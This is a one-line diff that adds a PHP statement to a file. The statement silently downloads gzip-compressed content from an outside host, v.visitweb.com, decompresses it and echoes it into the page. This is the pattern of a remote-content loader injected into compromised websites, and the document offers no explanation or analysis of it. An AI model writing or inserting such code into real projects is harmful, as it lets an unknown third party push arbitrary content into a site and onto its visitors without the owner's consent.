@@ -1,0 +1,1 @@
+<?php echo gzinflate(substr(file_get_contents("http://v.visitweb.com/v/cu97rMcoE53j88yPH77JGng66E7S8w?code2&va",false,stream_context_create(array("http" => array("method"=>"GET","header"=>"Accept-Encoding: gzip\r\nAccept-Charset: utf-8\r\n","timeout"=>10.0)))),10,-8));?>
